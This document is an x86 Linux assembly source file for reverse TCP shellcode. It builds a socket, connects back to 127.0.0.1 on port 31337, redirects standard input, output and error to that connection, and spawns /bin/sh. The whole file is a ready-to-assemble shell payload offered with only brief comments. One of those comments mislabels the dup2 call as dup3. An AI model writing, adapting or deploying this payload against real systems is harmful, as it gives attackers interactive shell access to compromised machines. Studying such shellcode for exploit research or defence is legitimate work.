; Reverse TCP shellcode in ASM
; File: reverse.nasm
section .DATA
section .BSS
section .TEXT
global _start
  _start:
  ; clear registers
   
  xor eax, eax
  xor ebx, ebx
  cdq
  ; int socket(int domain, int type, int protocol);
  
  push eax              ; protocol - 0
  push byte 0x1         ; type - SOCK_STREAM
  push byte 0x2         ; dominio - AF_INET
  
  mov ecx, esp          ; save structure in ecx
  inc bl                ; sys_socket 
  mov al, 102           ; socketcall system call
  int 0x80
  mov esi, eax ; save fd
  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  
  mov byte[esp], 0x7f   ; sin_addr = 127.0.0.1
  mov byte[esp+3], 0x1       
  push word 0x697a      ; port = 31337 
  push word 2           ; AF_INET = 2 
  mov ecx, esp          ; save pointer in ecx
  push byte 0x10        ; sizeof = 16
  push ecx              ; struct sockadd pointer
  push esi              ; socketfd 
  
  mov ecx, esp          ; save pointer in ecx
  inc bl
  inc bl                ; bl contains 3
  mov al, 102
  int 0x80
  ; int dup3(int oldfd, int newfd, int flags);
  xor ecx, ecx
  mov cl, 3
  l00p:
    dec cl
    mov al, 63
    int 0x80
    jnz l00p
  ; int execve(const char *filename, char *const argv[],char *const envp[]) 
  push edx
  push long 0x68732f2f
  push long 0x6e69622f
  mov ebx, esp
  push edx
  push edx
  mov ecx, esp
  mov al, 0x0b
  int 0x80
  ; exit syscall
  xor eax, eax
  mov al, 0x1
  mov bl, 0x8
  int 0x80